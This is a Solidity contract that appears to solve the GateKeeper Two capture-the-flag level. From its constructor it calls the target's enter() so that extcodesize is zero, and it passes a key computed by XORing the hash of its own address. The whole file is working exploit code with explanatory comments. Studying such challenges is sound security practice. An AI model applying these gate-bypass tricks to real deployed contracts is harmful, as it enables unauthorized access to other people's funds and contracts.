// SPDX-License-Identifier: MIT
pragma solidity 0.6.0;

import "./GateKeeperTwo.sol";

contract GateKeeperTwoAttack {

    GateKeeperTwo public gateKeeperTwo;
    
    constructor(address _targetAddrees) public {
        // 1- Gate is to call the victim contract from msg.sender/contract not tx.origin
        gateKeeperTwo = GateKeeperTwo(_targetAddrees);
        // 2- We much call the function enter inside the constructor, because the extsize ==0
        // 3- Gate is to generate the keygate
        bytes8 _key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ uint64(0) - 1);
        gateKeeperTwo.enter(_key);
    }

}